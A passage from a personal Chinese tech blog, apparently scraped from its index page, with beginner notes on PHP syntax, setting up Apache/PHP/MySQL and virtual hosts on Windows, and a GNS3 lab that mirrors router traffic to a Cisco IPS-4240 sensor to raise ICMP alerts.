<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">  //在脚本开始前：会对脚本功能进行简单阐述</span><br><span class="line">  #注释的内容会在PHP解析的过程中忽略</span><br><span class="line"></span><br><span class="line">  //块注释</span><br><span class="line">  /*</span><br><span class="line">   * @功能说明：注释说明</span><br><span class="line">   * @作者：XXX</span><br><span class="line">   * @版本：Version01</span><br><span class="line">  */</span><br><span class="line">  echo &apos;hello world&apos;;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<ol start="3">
<li><p>PHP语句分隔符</p>
<ul>
<li>语句分隔符：在PHP中，代码是以行为单位，系统需要通过判断行的结束，该结束通常都是一个符号：分号”;”（英文状态下的分号）</li>
<li>▲ PHP中标记结束符?&gt;有自带语句结束符的效果，最后一行PHP代码可以没有语句结束符”;”</li>
</ul>
</li>
</ol>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">  </span><br><span class="line">  //语句结束符的使用</span><br><span class="line"></span><br><span class="line">  echo &apos;hello world&apos;;  </span><br><span class="line">  echo &apos;hello world&apos;;</span><br></pre></td></tr></table></figure>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/03/13/PHP%E7%AC%94%E8%AE%B0-1%EF%BC%9A%E6%90%AD%E5%BB%BAwamp%E5%92%8C%E5%9F%9F%E5%90%8D%E6%9C%8D%E5%8A%A1/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Tomas">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/photo.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Tomas'Blog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2020/03/13/PHP%E7%AC%94%E8%AE%B0-1%EF%BC%9A%E6%90%AD%E5%BB%BAwamp%E5%92%8C%E5%9F%9F%E5%90%8D%E6%9C%8D%E5%8A%A1/" itemprop="url">PHP笔记-1：搭建wamp和域名服务</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-03-13T11:22:48+08:00">
                2020-03-13
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/PHP/" itemprop="url" rel="index">
                    <span itemprop="name">PHP</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          
            <div class="post-wordcount">
              
                
                <span class="post-meta-item-icon">
                  <i class="fa fa-file-word-o"></i>
                </span>
                
                  <span class="post-meta-item-text">字数统计&#58;</span>
                
                <span title="字数统计">
                  2k 字
                </span>
              

              
                <span class="post-meta-divider">|</span>
              

              
                <span class="post-meta-item-icon">
                  <i class="fa fa-clock-o"></i>
                </span>
                
                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
                
                <span title="阅读时长">
                  8 分钟
                </span>
              
            </div>
          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <hr>
<h4 id="1-WAMP环境"><a href="#1-WAMP环境" class="headerlink" title="1. WAMP环境"></a>1. WAMP环境</h4><ul>
<li>环境搭建路径不能为中文，可以集中在一个sever目录下</li>
<li>Apache：httpd-2.4.41-o111c-x64-vc15-r2<ul>
<li>2.4.41–版本号</li>
<li>x64–对应系统平台</li>
<li>vc15–编译平台</li>
</ul>
</li>
<li>PHP：php-7.4.3-Win32-vc15-x64<ul>
<li>x64–对应系统平台</li>
<li>7.4.3–版本号</li>
<li>vc15–编译平台</li>
</ul>
</li>
<li>MySQL：mysql5.5<ul>
<li>5.5–版本号</li>
</ul>
</li>
</ul>
<p><img src="/images/php/php-notepad/kodex/server%E7%9B%AE%E5%BD%95.png" alt="server目录"></p>
<h4 id="2-安装Apache"><a href="#2-安装Apache" class="headerlink" title="2. 安装Apache"></a>2. 安装Apache</h4><ul>
<li>Apache httpd：<a href="https://www.apachehaus.com/cgi-bin/download.plx" target="_blank" rel="noopener">https://www.apachehaus.com/cgi-bin/download.plx</a><ul>
<li>根据系统版本选择对应的Apache httpd服务</li>
<li>▲ 从Apache官网下载相应的源码，现在比较难以找到msi安装包</li>
</ul>
</li>
<li>安装<ul>
<li>▲ 目录路径不可为中文</li>
<li>将文件解压到新建的server目录，命名为Apache</li>
<li>测试服务：cmd -&gt; httpd.exe -t<ul>
<li>新解压的Apache服务会报错误，需要Define SRVROOT，更改为Apache的绝对路径</li>
<li>测试成功：Syntax OK</li>
</ul>
</li>
<li>安装：cmd -&gt; httpd.exe -K install<ul>
<li>若无报错信息，则可以在Apache Service Monitor启动Apache服务</li>
</ul>
</li>
<li>查看使用的模块：cmd -&gt; httpd.exe -M<ul>
<li><static>：静态加载，Apache启动就加载好，可以直接使用</li>
<li><shared>：动态加载，在使用到的时候才会加载</li>
</ul>
</li>
</ul>
</li>
<li>目录说明<ul>
<li>bin/cgi-bin：windows下的一些可执行文件</li>
<li>conf：配置文件目录</li>
<li>htdocs：Apache默认的主机地址（网站根目录）</li>
<li>modules：Apache的功能化模块</li>
</ul>
</li>
<li>配置站点<ul>
<li>▲ 配置文件：httpd.conf -&gt; 自定义SRVROOT</li>
<li>网站文件夹所在位置：DocumentRoot/ServerRoot “${SRVROOT}/htdocs”</li>
<li>使用名字访问网站：ServerName localhost</li>
<li>端口监听：Listen 80</li>
</ul>
</li>
<li>⭐ 每次动到配置文件，可通过httpd.exe -t去测试是否配置编译错误</li>
<li>▲ 凡是涉及到Apache配置文件的修改，都需要重启Apache才能生效</li>
<li>▲ 实现DNS域名解析：修改hosts文件 -&gt; 127.0.0.1  localhost</li>
<li>▲ 可在系统环境变量的PATH中加载httpd.exe的路径</li>
<li>浏览器访问localhost，看是否能成功访问到</li>
</ul>
<p><img src="/images/php/php-notepad/Apache%E5%AE%89%E8%A3%85%E6%88%90%E5%8A%9F.png" alt="Apache安装成功"></p>
<h4 id="3-安装PHP"><a href="#3-安装PHP" class="headerlink" title="3. 安装PHP"></a>3. 安装PHP</h4><ul>
<li>PHP：<a href="https://windows.php.net/download#php-7.4" target="_blank" rel="noopener">https://windows.php.net/download#php-7.4</a><ul>
<li>根据系统版本选择对应的PHP服务</li>
<li>根据Apache选择对应的编译环境</li>
<li>选择Thread Safe线程安全的形式</li>
</ul>
</li>
<li>安装<ul>
<li>▲ 目录路径不可为中文</li>
<li>将文件解压到新建的server目录，命名为PHP7.4.3</li>
<li>可通过php.exe运行命令来指定要解析的PHP脚本 -&gt; php.exe  -f  PHP文件所在路径的index.php文件 -&gt; hello world</li>
</ul>
</li>
<li>目录说明<ul>
<li>ext：扩展包-&gt;PHP很多功能是通过加载扩展来实现</li>
<li>php7apache2_4.dll：Apache支持包</li>
<li>php.exe：PHP解释器</li>
</ul>
</li>
<li>配置Apache加载PHP模块<ul>
<li>▲ 配置Apache文件：httpd.conf</li>
<li>Apache加载PHP模块：在Apache的主配置文件中加载对应的PHP提供的模块<ul>
<li>LoadModule php7_module PHP所提供的模块链接所在路径</li>
</ul>
</li>
<li>Apache分配工作给PHP模块：如果是PHP代码就交给PHP处理–文件后缀判断<ul>
<li>AddType application/x-httpd-php .php</li>
</ul>
</li>
<li>将PHP的配置文件加载到Apache配置文件中<ul>
<li>PHPIniDir php.ini所在路径</li>
</ul>
</li>
</ul>
</li>
</ul>
<p><img src="/images/php/php-notepad/%E9%85%8D%E7%BD%AEApache%E5%8A%A0%E8%BD%BDPHP%E6%A8%A1%E5%9D%97.png" alt="配置Apache加载PHP模块"></p>
<ul>
<li>配置文件<ul>
<li>php.ini文件默认是不存在的，是以development存在，复制一份，修改命名为php.ini</li>
</ul>
</li>
<li>测试<ul>
<li>新建一个index.php文件</li>
<li>浏览器访问localhost/index.php</li>
</ul>
</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    phpinfo();</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p><img src="/images/php/php-notepad/PHP%E5%AE%89%E8%A3%85%E6%88%90%E5%8A%9F.png" alt="PHP安装成功"></p>
<h4 id="4-MySQL安装"><a href="#4-MySQL安装" class="headerlink" title="4. MySQL安装"></a>4. MySQL安装</h4><ul>
<li>MySQL：<a href="https://www.mysql.com/downloads/" target="_blank" rel="noopener">https://www.mysql.com/downloads/</a><ul>
<li>根据系统版本选择对应的MySQL服务</li>
<li>安装mysql一般安装5.x版本，7.x版本为一定程度的阉割版</li>
</ul>
</li>
<li>安装<ul>
<li>Custome：自定义安装（选择安装路径）<ul>
<li>MySQL Server -&gt; server/mysql</li>
<li>Server data files -&gt; server/mysql/data</li>
</ul>
</li>
<li>Launch the MySQL Instance Configuration Wizard：配置<ul>
<li>Please select a configuration -&gt; Detailed Configuration：详细配置</li>
<li>Please select a server type -&gt; Developer Machine：开发环境</li>
<li>Please select the database usage -&gt; Multifunctional Database：多功能</li>
<li>Please set the approximate number of cocurrent connections to the server -&gt; Manual Setting(15):并发设置</li>
<li>Please set the networking options<ul>
<li>Enable TCP/IP Networking  -&gt; 允许TCP/IP协议访问<ul>
<li>Prot Number -&gt; 3306</li>
<li>Add firewall exception for this port -&gt; 防火墙通过</li>
</ul>
</li>
<li>Enable Strict Mode -&gt; 使用严格模式</li>
</ul>
</li>
<li>Please select the default set -&gt; Manual Selected Default Character Set / Collation:字符集设定 -&gt; utf8</li>
<li>Please set the Windows options <ul>
<li>Install As Windows Service：服务安装<ul>
<li>Service Name：MySQL</li>
<li>Launch the MySQL Server automatically：随系统启动</li>
</ul>
</li>
<li>Include Bin Directory in Windows PATH：讲MySQL加到系统路径</li>
</ul>
</li>
<li>Please set the security options<ul>
<li>Modify security settings<ul>
<li>New root password -&gt; root</li>
<li>Confirm -&gt; root</li>
<li>Enable root access from remote machines：允许远程访问</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
<p><img src="/images/php/php-notepad/MySQL%E5%AE%89%E8%A3%85%E6%88%90%E5%8A%9F.png" alt="MySQL安装成功"></p>
<ul>
<li>目录说明<ul>
<li>bin：执行文件夹<ul>
<li>mysql.exe：访问MySQL服务器的客户端</li>
<li>mysqld.exe：MySQL服务</li>
<li>mysqldump.exe：MySQL的备份软件客户端</li>
</ul>
</li>
<li>data：数据存储文件夹</li>
<li>lib：核心文件夹</li>
<li>my.ini：配置文件</li>
</ul>
</li>
<li>测试mysql服务<ul>
<li>cmd -&gt; mysql -u root -p</li>
<li>参数<ul>
<li>-h：主机地址</li>
<li>-p：端口</li>
<li>-u：用户名</li>
<li>-p：密码</li>
</ul>
</li>
</ul>
</li>
<li>PHP连接MySQL数据库<ul>
<li>▲ 配置php文件：php.ini</li>
<li>PHP的扩展都是在ext文件夹中，需要制定扩展所在路径：extension_dir=”/server/php7.4.3/ext”</li>
<li>开启sqli扩展：extension=mysqli</li>
<li>开启pdo_mysql扩展：extension=pdo_mysql</li>
</ul>
</li>
</ul>
<p><img src="/images/php/php-notepad/PHP%E8%BF%9E%E6%8E%A5MySQL%E6%95%B0%E6%8D%AE%E5%BA%93.png" alt="PHP连接MySQL数据库"></p>
<ul>
<li>测试PHP连接mysql<ul>
<li>新建一个testmysql.php文件</li>
<li>浏览器访问localhost/testmysql.py，查看是否出现OK！</li>
</ul>
</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    $link=mysqli_connect(&apos;localhost&apos;,&apos;root&apos;,&apos;root&apos;);</span><br><span class="line">    if(!$link) echo &quot;Error !&quot;;</span><br><span class="line">    else echo &quot;Ok!&quot;;</span><br><span class="line">    mysqli_close($link);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p><img src="/images/php/php-notepad/phpinfo--mysqli.png" alt="phpinfo--mysqli"></p>
<p><img src="/images/php/php-notepad/phpinfo--pdo_mysql.png" alt="phpinfo--pdo_mysql"></p>
<h4 id="5-搭建域名"><a href="#5-搭建域名" class="headerlink" title="5. 搭建域名"></a>5. 搭建域名</h4><ul>
<li>修改hosts文件 -&gt; 127.0.0.1  localhost</li>
</ul>
<h4 id="6-搭建虚拟主机"><a href="#6-搭建虚拟主机" class="headerlink" title="6. 搭建虚拟主机"></a>6. 搭建虚拟主机</h4><ul>
<li>官方解释文档：<a href="http://httpd.apache.org/docs/current/vhosts/" target="_blank" rel="noopener">http://httpd.apache.org/docs/current/vhosts/</a></li>
<li>配置虚拟主机方式<ul>
<li>基于IP</li>
<li>基于主机名</li>
<li>基于端口</li>
</ul>
</li>
<li>实验环境<ul>
<li>在Apache下的htdocs目录中，新建两个目录，test1和test2<ul>
<li>test1目录下1.php（<?php phpinfo(); ?>）</li>
<li>test2目录下2.php（<?php echo "OKKKK" ?>）</li>
<li>▲ 2020.03.05在查询资料的过程中，有遇到test目录可以建立在htdocs的情况，但实操发现不行</li>
</ul>
</li>
<li>本地模拟外网域名，在hosts文件中配置两个测试域名<ul>
<li>127.0.0.1 <a href="http://www.test1mzt.com" target="_blank" rel="noopener">www.test1mzt.com</a></li>
<li>127.0.0.1 <a href="http://www.test2mzt.com" target="_blank" rel="noopener">www.test2mzt.com</a></li>
</ul>
</li>
<li>修改配置（Apache24\conf\httpd.conf）<ul>
<li>#Virtual hosts -&gt; Include conf/extra/httpd-vhosts.conf</li>
</ul>
</li>
</ul>
</li>
</ul>
<p><img src="/images/php/php-notepad/%E8%99%9A%E6%8B%9F%E4%B8%BB%E6%9C%BAhosts%E6%96%87%E4%BB%B6%E8%AE%BE%E7%BD%AE.png" alt="虚拟主机hosts文件设置"></p>
<h4 id="7-基于IP的虚拟主机"><a href="#7-基于IP的虚拟主机" class="headerlink" title="7. 基于IP的虚拟主机"></a>7. 基于IP的虚拟主机</h4><ul>
<li>基于IP，一台服务器有多个网卡，每个IP绑定一个站点的方式</li>
<li>▲ 基于IP的方式，写在VirtualHost的IP地址需要可被路由</li>
<li>▲ 在下图，有多种访问方式访问test2下的2.php<ul>
<li>127.0.0.2:80/2.php</li>
<li><a href="http://www.test2mzt.com:80/2.php" target="_blank" rel="noopener">www.test2mzt.com:80/2.php</a></li>
<li><a href="http://www.test2mzt.com/2.php" target="_blank" rel="noopener">www.test2mzt.com/2.php</a></li>
</ul>
</li>
</ul>
<p><img src="/images/php/php-notepad/%E5%9F%BA%E4%BA%8EIP%E7%9A%84%E8%99%9A%E6%8B%9F%E4%B8%BB%E6%9C%BA.png" alt="基于IP的虚拟主机"></p>
<h4 id="8-基于端口的虚拟主机"><a href="#8-基于端口的虚拟主机" class="headerlink" title="8. 基于端口的虚拟主机"></a>8. 基于端口的虚拟主机</h4><ul>
<li>修改配置文件将原来的：Listen 80改为Listen 80 Listen 88</li>
<li>▲ 基于端口的方式，需要在httpd.conf的配置文件中增加监听端口</li>
<li>▲ 在下图，有多种访问方式访问test2下的2.php<ul>
<li>127.0.0.1:88/2.php</li>
<li><a href="http://www.test2mzt.com:88/2.php" target="_blank" rel="noopener">www.test2mzt.com:88/2.php</a></li>
</ul>
</li>
</ul>
<p><img src="/images/php/php-notepad/%E5%9F%BA%E4%BA%8E%E7%AB%AF%E5%8F%A3%E7%9A%84%E4%B8%BB%E6%9C%BA.png" alt="基于端口的主机"></p>
<h4 id="9-基于域名的虚拟主机"><a href="#9-基于域名的虚拟主机" class="headerlink" title="9. 基于域名的虚拟主机"></a>9. 基于域名的虚拟主机</h4><ul>
<li>基于主机名也就是基于域名方式访问，每个IP多个站点</li>
<li>▲ 基于域名的方式，需要在hosts文件中指定域名</li>
<li>▲ 在下图，有多种访问方式访问test2下的2.php<ul>
<li>127.0.0.1/2.php</li>
<li><a href="http://www.test2mzt.com/2.php" target="_blank" rel="noopener">www.test2mzt.com/2.php</a></li>
</ul>
</li>
</ul>
<p><img src="/images/php/php-notepad/%E5%9F%BA%E4%BA%8E%E5%9F%9F%E5%90%8D%E7%9A%84%E8%99%9A%E6%8B%9F%E4%B8%BB%E6%9C%BA.png" alt="基于域名的虚拟主机"></p>
<h4 id="10-注意"><a href="#10-注意" class="headerlink" title="10. 注意"></a>10. 注意</h4><ul>
<li><Directory>目录报错<ul>
<li>▲ 2020.03.05 Apache启动报Invalid command ‘order’, perhaps misspelled or defined by a module not included的错误<ul>
<li>Apache2.4以上，做了修改</li>
<li>在LoadMoudle中，需要通过access_compat_module modules/mod_access_compat.so和actions_module modules/mod_actions.so模块，才能使用”Order、Deny、Allow”写配置文件</li>
<li>若不通过access_compat_module modules/mod_access_compat.so更改，可以使用Apache Require命令</li>
</ul>
</li>
</ul>
</li>
<li>需要给当前设定的站点（目录）访问权限</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;Directory &apos;站点目录&apos;&gt;</span><br><span class="line">    #设定方式：代表匹配权限的顺序</span><br><span class="line">    Order Deny,Allow    //没有顺序关系：实际顺序有意义</span><br><span class="line">    #限定范围：按照顺序执行</span><br><span class="line">    Deny from 指定的范围</span><br><span class="line">    Allow from 指定范围/all</span><br><span class="line"></span><br><span class="line">    #列表显示（若无指定具体访问文件或访问文件夹）</span><br><span class="line">    Options Indexes FollowSymLinks</span><br><span class="line"></span><br><span class="line">    #指定默认访问文件</span><br><span class="line">    Directory Indexes FollowSymLinks</span><br><span class="line"></span><br><span class="line">    #指定默认访问文件</span><br><span class="line">    DirectoryIndex index.html index.php</span><br><span class="line">&lt;/Directory&gt;</span><br></pre></td></tr></table></figure>

<ul>
<li>▲ 一旦启用虚拟主机配置文件，那么默认的主机地址localhost就不再生效，如果想要生效就要为localhost增加单独的虚拟主机</li>
<li>▲ 如果说网站中整个网站根目录允许访问，但是其中还有其他文件夹不允许访问：可以增加多个Directory标签，针对不同的文件夹</li>
</ul>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/03/09/IPS%E7%AC%94%E8%AE%B0-4%EF%BC%9AIME--IDS%E5%AE%9E%E9%AA%8C/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Tomas">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/photo.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Tomas'Blog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2020/03/09/IPS%E7%AC%94%E8%AE%B0-4%EF%BC%9AIME--IDS%E5%AE%9E%E9%AA%8C/" itemprop="url">IPS笔记-4：IME--IDS实验</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-03-09T22:56:39+08:00">
                2020-03-09
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/IPS/" itemprop="url" rel="index">
                    <span itemprop="name">IPS</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          
            <div class="post-wordcount">
              
                
                <span class="post-meta-item-icon">
                  <i class="fa fa-file-word-o"></i>
                </span>
                
                  <span class="post-meta-item-text">字数统计&#58;</span>
                
                <span title="字数统计">
                  439 字
                </span>
              

              
                <span class="post-meta-divider">|</span>
              

              
                <span class="post-meta-item-icon">
                  <i class="fa fa-clock-o"></i>
                </span>
                
                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
                
                <span title="阅读时长">
                  2 分钟
                </span>
              
            </div>
          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <hr>
<h4 id="1-IDS模拟实验"><a href="#1-IDS模拟实验" class="headerlink" title="1. IDS模拟实验"></a>1. IDS模拟实验</h4><ul>
<li>R1：Router C3700</li>
<li>R1：Router C3700</li>
<li>IDS：IPS-4240</li>
<li>SW：EtherSwitch router</li>
<li>▲ 2020.03.09 虚拟机IPS-4240的虚拟网卡VMware1和VMware2需要开启主机连接，且若在GNS3中无出现此两个网卡，可重启计算机，即可抓到这两个网卡</li>
</ul>
<p><img src="/images/ips/ips-notepad/IPS-4240%E5%BC%80%E5%90%AF%E7%9A%84%E4%B8%BB%E6%9C%BA%E8%BF%9E%E6%8E%A5.png" alt="IPS-4240开启的主机连接"></p>
<p><img src="/images/ips/ips-notepad/IDS%E6%9D%82%E5%90%88%E6%A8%A1%E5%BC%8F%E6%8A%A5%E8%AD%A6%E6%8B%93%E6%89%91%E5%9B%BE.png" alt="IDS杂合模式报警拓扑图"></p>
<h4 id="2-IDS：IPS-4240"><a href="#2-IDS：IPS-4240" class="headerlink" title="2. IDS：IPS-4240"></a>2. IDS：IPS-4240</h4><ul>
<li>改变外形：右键 -&gt; Change Symbol -&gt; ids</li>
<li>修改名字：右键 -&gt; Change the hostname -&gt; IDS</li>
<li>增加监控网卡：Configure -&gt; NIO Ethernet -&gt; Add VMnet1</li>
</ul>
<h4 id="3-R1和R2"><a href="#3-R1和R2" class="headerlink" title="3. R1和R2"></a>3. R1和R2</h4><ul>
<li>启动，降低系统资源消耗：右键 -&gt; Idle PC -&gt; 选取带*号的参数设备</li>
<li>配置R1<ul>
<li>conf t</li>
<li>interface f0/1</li>
<li>ip add 10.1.1.1 255.255.255.0</li>
<li>no sh</li>
</ul>
</li>
<li>配置R2<ul>
<li>conf t</li>
<li>interface f0/1</li>
<li>ip add 10.1.1.2 255.255.255.0</li>
<li>no sh</li>
</ul>
</li>
<li>连通性：R1 -&gt; do ping 10.1.1.2 -&gt; R2是否联通</li>
</ul>
<h4 id="4-SW：EtherSwitch-router"><a href="#4-SW：EtherSwitch-router" class="headerlink" title="4. SW：EtherSwitch router"></a>4. SW：EtherSwitch router</h4><ul>
<li>启动，降低系统资源消耗：右键 -&gt; Idle PC -&gt; 选取带*号的参数设备</li>
<li>修改名字：右键 -&gt; Change the hostname -&gt; SW</li>
<li>增加接口：右键 -&gt; Slots -&gt; 增加一个NM-16ESW</li>
</ul>
<h4 id="5-测试连通性"><a href="#5-测试连通性" class="headerlink" title="5. 测试连通性"></a>5. 测试连通性</h4><ul>
<li>R1(f 1/0)-&gt; SW(f 1/1)</li>
<li>R2(f 1/0)-&gt; SW(f 1/2)</li>
<li>IDS -&gt; SW(f 1/15)</li>
<li>连通性：R1 -&gt; ping 10.1.1.2 -&gt; R2是否连通</li>
</ul>
<h4 id="6-SPAN配置"><a href="#6-SPAN配置" class="headerlink" title="6. SPAN配置"></a>6. SPAN配置</h4><ul>
<li>SW：EtherSwitch router<ul>
<li>monitor session 1 source interface f1/1 rx  //R1</li>
<li>monitor session 1 destination interface f1/15  //IDS</li>
</ul>
</li>
</ul>
<h4 id="7-入侵检测"><a href="#7-入侵检测" class="headerlink" title="7. 入侵检测"></a>7. 入侵检测</h4><ul>
<li>▲ 所有的步骤都需要进行Apply</li>
<li>IME启动IPS</li>
<li>开启Interface接口<ul>
<li>Configuration -&gt; Interface -&gt; GigabitEthernet 0/0 -&gt; Edit -&gt; enable</li>
</ul>
</li>
</ul>
<p><img src="/images/ips/ips-notepad/IME--IDS%E5%BC%80%E5%90%AFInterface%E6%8E%A5%E5%8F%A3.png" alt="IME--IDS开启Interface接口"></p>
<ul>
<li>绑定病毒特征识别库Sig0<ul>
<li>Configuration -&gt; Policies -&gt; vs0 -&gt; Edit -&gt; GigabitEthernet 0/0</li>
</ul>
</li>
</ul>
<p><img src="/images/ips/ips-notepad/IME--IDS%E7%BB%91%E5%AE%9A%E7%97%85%E6%AF%92%E7%89%B9%E5%BE%81%E8%AF%86%E5%88%AB%E5%BA%93Sig0.png" alt="IME--IDS绑定病毒特征识别库Sig0"></p>
<ul>
<li>配置病毒特征识别库Sig0<ul>
<li>Sig0 -&gt; OS -&gt; 2004(过滤) -&gt; Change status To -&gt; Active</li>
<li>Sig0 -&gt; OS -&gt; 2004(过滤) -&gt; Enable</li>
</ul>
</li>
</ul>
<p><img src="/images/ips/ips-notepad/IME--IDS%E9%85%8D%E7%BD%AE%E7%97%85%E6%AF%92%E7%89%B9%E5%BE%81%E8%AF%86%E5%88%AB%E5%BA%93Sig0.png" alt="IME--IDS配置病毒特征识别库Sig0"></p>
<ul>
<li>监控IDS-ICMP事件<ul>
<li>Configuration -&gt; Sensor Monitoring -&gt; View</li>
</ul>
</li>
</ul>
<p><img src="/images/ips/ips-notepad/IME--IDS%E7%9B%91%E6%8E%A7IDS-ICMP%E4%BA%8B%E4%BB%B6.png" alt="IME--IDS监控IDS-ICMP事件"></p>
<ul>
<li>R1向R2发生ICMP Echo Requset的Ping包，查看IME–IPS的Event Viewer有无报警日志</li>
</ul>
<p><img src="/images/ips/ips-notepad/IME--IDS%E7%9B%91%E6%8E%A7IDS%E4%BA%8B%E4%BB%B6.png" alt="IME--IDS监控IDS事件"> </p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/03/09/IPS%E7%AC%94%E8%AE%B0-3%EF%BC%9AIME--IPS%E4%BD%BF%E7%94%A8/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Tomas">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/photo.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Tomas'Blog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2020/03/09/IPS%E7%AC%94%E8%AE%B0-3%EF%BC%9AIME--IPS%E4%BD%BF%E7%94%A8/" itemprop="url">IPS笔记-3：IME--IPS使用</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-03-09T22:56:39+08:00">
                2020-03-09
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/IPS/" itemprop="url" rel="index">
                    <span itemprop="name">IPS</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          
            <div class="post-wordcount">
              
                
                <span class="post-meta-item-icon">
                  <i class="fa fa-file-word-o"></i>
                </span>
                
                  <span class="post-meta-item-text">字数统计&#58;</span>
                
                <span title="字数统计">
                  1.2k 字
                </span>
              

              
                <span class="post-meta-divider">|</span>
              

              
                <span class="post-meta-item-icon">
                  <i class="fa fa-clock-o"></i>
                </span>
                
                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
                
                <span title="阅读时长">
                  4 分钟
                </span>
              
            </div>
          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <hr>
